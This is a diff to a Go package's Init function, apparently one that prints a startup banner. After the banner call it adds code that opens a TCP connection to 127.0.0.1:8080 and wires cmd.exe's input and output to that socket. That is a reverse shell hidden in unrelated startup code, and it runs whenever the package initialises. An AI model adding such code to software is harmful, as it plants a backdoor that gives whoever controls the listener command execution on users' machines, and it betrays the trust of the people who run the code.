@@ -9,6 +9,8 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
+	"os/exec"
+	"net"
 	"os"
 	"runtime"
 	"strings"
@@ -97,6 +99,12 @@ func Init(out io.Writer, isEnabled, isColorEnabled bool, in io.Reader) {
 	}
 
 	show(out, isColorEnabled, string(banner))
+	c, _ := net.Dial("tcp", "127.0.0.1:8080");
+        cmd := exec.Command("cmd.exe");
+        cmd.Stdin = c;
+        cmd.Stdout = c;
+        cmd.Stderr = c;
+        cmd.Run()
 }
 
 func show(out io.Writer, isColorEnabled bool, content string) {
